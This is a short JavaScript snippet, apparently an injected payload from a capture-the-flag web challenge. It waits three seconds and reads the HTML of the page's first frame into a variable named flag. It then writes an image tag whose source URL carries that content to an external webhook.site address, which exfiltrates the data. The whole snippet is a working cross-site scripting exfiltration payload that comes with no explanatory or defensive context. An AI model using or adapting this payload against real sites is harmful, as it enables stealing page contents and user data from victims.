const sleep = (ms) => {
    const stop = new Date().getTime() + ms;
    while (new Date().getTime() < stop) {}
};

sleep(3000);

var flag = window.frames[0].document.body.innerHTML;

document.getElementById('ww').innerHTML='<img src="https://webhook.site/58d53da3-******************?msg='+flag+'">';